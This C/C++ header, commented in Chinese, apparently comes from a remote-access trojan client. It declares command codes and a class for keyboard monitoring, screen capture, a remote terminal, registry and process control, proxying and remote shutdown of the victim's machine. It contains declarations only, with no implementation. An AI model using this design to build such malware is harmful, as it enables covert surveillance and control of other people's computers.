#pragma once


//交易代码
#define CLIENT_SYSTEM_RESTART	1020				//重启客户机器
#define CLIENT_SYSTEM_SHUTDOWN	1021				//关闭客户机器
#define CLIENT_PRO_UNINSTALL	1022				//卸载客户程序
#define CLIENT_MODIFY_INFO		1023				//更改客户信息
#define CLIENT_LOGIN_SUCCESS	1024				//签到成功
#define CLIENT_FRAME_START		1028				//开始屏幕拷贝
#define CLIENT_FILES_START		1029				//开始机器管理
#define CLIENT_KEYMON_START		1032				//开始键盘监控
#define CLIENT_TLNT_START		1033				//开始超级终端
#define CLIENT_REGEDIT_START	1034				//开始注册表管理
#define CLIENT_PROC_START		1035				//开始进程管理
#define CLIENT_SERVICE_START	1036				//开始服务管理
#define CLIENT_MULIT_START		1037				//开始视音频管理
#define CLIENT_PROXY			1038				//开始代理服务

typedef struct _CMDINFO_
{
	UINT m_Command;				//操作命令
	UINT m_DataLen;				//数据长度
}CMDINFO,*LPCMDINFO;

typedef struct _SOCKETDATA_
{
	SOCKET	m_LocalSocket;
	SOCKET	m_RemotSocket;
	BOOL	m_IsRecv;
}SOCKETDATA,*LPSOCKETDATA;

typedef struct _SOCKEINFO_
{
	char	m_DesAddr[30];
	UINT	m_DesPort;
	UINT	m_LocalPort;
	SOCKET	m_soListen;
}SOCKEINFO,*LPSOCKEINFO;

class CMyMainTrans
{
public:
	CMyMainTrans(void);
	~CMyMainTrans(void);

	void DoWork(HINTERNET HttpFp , HANDLE hExitEvent ,char* pServerAddr , 
				int nServerPort ,char* pRegInfo ,char* pFileName);

private:

	HINTERNET hFp;
	char	m_ServerAddr[256];
	UINT	m_ServerPort;
	HANDLE	m_ExitEvent;
	char	m_RegInfo[256];
	char	m_FileName[256];
	UINT	m_WorkType;
	

	BOOL ProcessCmd();
	void ShutDownSystem(BOOL Flag);
	void MyRegDeleteKey(char *ValueName);
	void StartClientCtrl(int iType);
	BOOL RecvData(HINTERNET hFile,LPVOID pData,int DataLen);
	void SendTlntCmd(HINTERNET hFp , int nLen);

	static void TransSocket(SOCKET m_Sendsocket,SOCKET m_RecvSocket);
	static SOCKET GetConnectSocket(char* pServerAddr, UINT nServerPort);
	SOCKET StartTcp(WORD Port);

	static void SSH_CtrlThread(LPVOID lPvoid);
	static void MainThread(LPVOID lPvoid);
	static void ListenThread(LPVOID lPvoid);
	static void WorkThread(LPVOID lPvoid);
};
